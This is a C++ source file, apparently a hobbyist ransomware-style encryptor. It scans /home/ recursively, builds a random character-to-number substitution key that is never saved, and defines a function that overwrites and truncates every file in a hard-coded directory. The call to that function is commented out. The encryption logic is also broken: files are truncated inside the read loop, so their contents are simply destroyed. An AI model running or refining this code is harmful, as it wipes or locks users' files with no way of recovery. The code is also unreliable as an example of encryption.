#include <iostream>
#include <string>
#include <filesystem>
#include <fstream>
#include <random>
#include <map>
#include <unordered_map>

auto encryptor(std::string &path, std::map<char, int> &encryption, char &byte) -> void {
    for (const auto &entry : std::filesystem::directory_iterator(path)) {
        std::ifstream read(entry.path());

        if (!read.is_open()) std::cerr << "[-] Could not open the file - '" << path << "'" << std::endl;
        else std::cout << "File opened" << std::endl;
        auto encrypt = std::fstream(entry.path(), std::ios::out | std::ios::app);

        while (read.get(byte)) {
            if (encryption.contains(byte)) {
                for (auto const &it : encryption) {
                    if (it.first == byte) {
                        encrypt << it.second;
                    }
                }
                encrypt << '\n';
            }
            std::ofstream ofs;
            ofs.open(entry.path(), std::ofstream::out | std::ofstream::trunc);
            ofs.close();
        }
        std::cout << "[*] File encrypted successfully\n" << std::endl;
    }
}

auto main() -> int {

    std::unordered_map<std::string, int> directories;

    for (std::filesystem::recursive_directory_iterator i("/home/"), end; i != end; ++i) {
        if (!is_directory(i->path())) {
            directories[i->path().filename()];
        }
    }

    for (auto &it : directories) {
        it.second++;
        std::cout << it.first << " - " << it.second << std::endl;
    }

    auto path = std::string("/home/draco/TobeEncrypted");
    char byte = 0;

    std::string combinations = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+=[]{};:'\",./?,<~>`|\\1234567890";
    unsigned seed = std::chrono::steady_clock::now().time_since_epoch().count();
    std::default_random_engine engine(seed);
    int key;

    std::map<char, int> encryption;

    for (auto &combination : combinations) {
        std::uniform_int_distribution<int> keys(100000, 999999);
        key = keys(engine);
        encryption[combination] = key;
    }

    //encryptor(path, encryption, byte);
}
